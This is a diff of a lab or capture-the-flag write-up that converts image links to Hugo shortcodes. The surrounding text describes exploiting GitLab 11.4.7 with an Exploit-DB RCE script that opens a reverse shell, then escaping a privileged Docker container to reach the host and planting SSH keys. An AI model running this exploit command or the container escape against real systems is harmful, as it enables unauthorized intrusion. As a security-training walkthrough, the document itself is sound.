@@ -42,31 +42,31 @@ PORT     STATE SERVICE VERSION
 
 The webserver on port 5080 runs a Gitlab instance.
 
-![](image/gitlab1.png)
+{{< image src="image/gitlab1.png" >}}
 
 We have access to create a new account.
 
-![](image/gitlab2.png)
+{{< image src="image/gitlab2.png" >}}
 
 Once logged in, we see in the projects list there's a single projet called *ready-channel*.
 
-![](image/gitlab3.png)
+{{< image src="image/gitlab3.png" >}}
 
 To check the Gitlab version we go to the Help section and we can see it's running 11.4.7.
 
-![](image/gitlab5.png)
+{{< image src="image/gitlab5.png" >}}
 
 A quick search on Exploit-DB shows there's an authenticated remote code execution vulnerability for this exact version.
 
-![](image/gitlab6.png)
+{{< image src="image/gitlab6.png" >}}
 
 `python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444`
 
 Reverse shell connection:
 
-![](image/shell.png)
+{{< image src="image/shell.png" >}}
 
-![](image/user.png)
+{{< image src="image/user.png" >}}
 
 ## Privesc
 
@@ -109,7 +109,7 @@ If we look at the `/opt/backup/docker-compose.yml` configuration file, we can se
 
 Privileged containers can access the host's disk devices so we can just read the root flag after mounting the drive.
 
-![](image/root.png)
+{{< image src="image/root.png" >}}
 
 To get a proper shell in the host OS we can drop our SSH keys in the root's .ssh directory.
 
